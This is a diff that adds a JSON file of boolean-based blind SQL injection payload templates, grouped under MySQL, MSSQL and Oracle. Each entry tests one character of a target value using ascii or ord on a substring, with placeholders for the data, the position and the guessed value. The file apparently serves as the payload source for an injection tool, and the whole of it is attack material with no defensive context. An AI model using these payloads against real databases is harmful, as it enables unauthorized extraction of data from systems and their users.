@@ -1,0 +1,38 @@
+{
+ "mysql": [
+  {
+   "payload": "and(ascii(mid([DATA],[POSITION],1))=[DATANUM])"
+  },
+  {
+   "payload": "and(ascii(substring([DATA],[POSITION],1))=[DATANUM])"
+  },
+  {
+   "payload": "and(ascii(substr([DATA],[POSITION],1))=[DATANUM])"
+  },
+  {
+   "payload": "and(ord(mid([DATA],[POSITION],1))like'[DATANUM]')"
+  },
+  {
+   "payload": "and(ord(substring([DATA],[POSITION],1))like'[DATANUM]')"
+  },
+  {
+   "payload": "and(ord(substr([DATA],[POSITION],1))like'[DATANUM]')"
+  }
+ ],
+ "mssql": [
+  {
+   "payload": "and(ascii(substring([DATA],[POSITION],1))=[DATANUM])"
+  },
+  {
+   "payload": "and(ascii(substring([DATA],[POSITION],1))like'[DATANUM]')"
+  }
+ ],
+ "oracle": [
+  {
+   "payload": "and(ascii(substr([DATA],[POSITION],1))=[DATANUM])"
+  },
+  {
+   "payload": "and(ascii(substr([DATA],[POSITION],1))like'[DATANUM]')"
+  }
+ ]
+}
